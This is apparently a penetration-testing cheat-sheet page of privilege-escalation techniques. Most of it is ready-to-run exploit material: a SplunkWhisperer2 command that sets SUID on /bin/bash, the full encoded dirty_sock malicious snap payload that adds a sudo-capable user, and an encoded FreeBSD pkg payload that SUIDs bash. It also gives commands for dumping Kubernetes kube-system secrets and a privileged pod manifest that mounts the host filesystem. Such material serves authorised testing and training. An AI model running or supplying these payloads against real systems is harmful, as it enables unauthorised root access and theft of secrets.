# Misc

### Splunk Management Port Exposed \(8089\)

[Exploit](https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py):

```text
python2 PySplunkWhisperer2_remote.py --host <rhost> --lhost <lhost> --payload="chmod u+s /bin/bash"
```

### Install Malicious Snap Package

In case you get the chance to install a snap package with elevated privileges \(e.g. `sudo snap install *`\), you can use the following packet, extracted from this [exploit ](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py):

```text
python -c 'print("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "==")' | base64 -d > payload.snap
```

Install:

```text
sudo snap install /dev/shm/payload.snap --dangerous --devmode
```

This will add a new user `dirty_sock:dirty_sock` who can `sudo -i` .

### Install Malicious Pkg Package \(FreeBSD\)

In case you get the chance to install a package via pkg with elevated privileges \(e.g. `sudo pkg install *`\), you can use the following snippet to escalate privileges:

```bash
echo -ne "/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4Av/AZtdABWQxeTpWUBe1eamP+ls2fn+
YN5XsDfDEr8t27Md5JzP4t+8d/o0LE//NyAUGS7Wf+A+JeCbQlP7soODqDlA1LLF
SpsIL1H7nDpk/zu8AMu+Kgu7qmgRsxKQ6QFypLMcPt2VtMB6GUwmwyvSRD6TZed7
G/N6i1kjHvBJBJFhqUf2qUQx+k7gUGAkRZVorBZQeZ//7jkNWNd9a2M9Sh1z4saF
qdOyrl/C5qeYjtZIGiK8wqSinEoirmXoqCacF98wcFiTiqBWhYFUkGWcVEv/dW8Z
wGCN9iaMKX2BYjuwJ+9q98bKYCvlodaKrCuigUW/JF5bQFhbFVEGOSXbQjoSEEFy
9OeHKHqsCeAeu5oV6qxtZHCXkHHO2Yl5Cbp8hN1qgDu8ojyrVnGYmoJi2tmINwi8
/Czx34dfsEJKuJsAR77vQRiyhVJHTiE/WiWEYOZWkOY6iBaQ0Rc4VL9+oACiI3TS
aw2JH9AIOibY84bHiSKqX1VxPT1qd4VXmG6UK+M68CIlPbI+4EplcQd/Myc7qMw1
ggFhIiDewQE+AAAA0hV/rwDb4ksAAbcDgBgAADPJVnyxxGf7AgAAAAAEWVo=" | openssl enc -base64 -d > mypackage-1.0_5.txz
sudo pkg install --no-repo-update mypackage-1.0_5.txz
```

The payload runs `chmod u+s /bin/bash` , so you can now use `bash -p` to become root.

Source: [http://lastsummer.de/creating-custom-packages-on-freebsd/](http://lastsummer.de/creating-custom-packages-on-freebsd/)

### Kubernetes

#### Get Secrets \(requires prvileges\)

```text
curl -v -H "Authorization: Bearer eyJh..." https://***:443/api/v1/namespaces/kube-system/secrets/ -k
```

Alternative:

```text
kubectl get secrets -n kube-system
```

#### Deploy privileged pod \(requires privileges/admin token\)

xct.yaml:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: xct
  namespace: kube-system
spec:
  containers:
  - name: xct
    image: dev-alpine
    stdin: true
    tty: true
    imagePullPolicy: IfNotPresent
    volumeMounts:
      - mountPath: /chroot
        name: host
  securityContext:
    privileged: true
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

Then run:

```bash
kubectl --token=$(cat admin-token) create -f xct.yaml --validate=false
kubectl --token=$(cat admin-token) exec -n kube-system --stdin --tty pod/xct -- /bin/sh
```

With no kubectl on the box you can copy over token, ca.crt & run it remotely:

```text
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl

ls
ca.crt  kubectl  root.yml  token

./kubectl apply -f root.yml --token $(cat token) --server https://10.10.36.58:6443 --certificate-authority ca.crt
pod/alpine configured
```

#### Resources

* [https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)



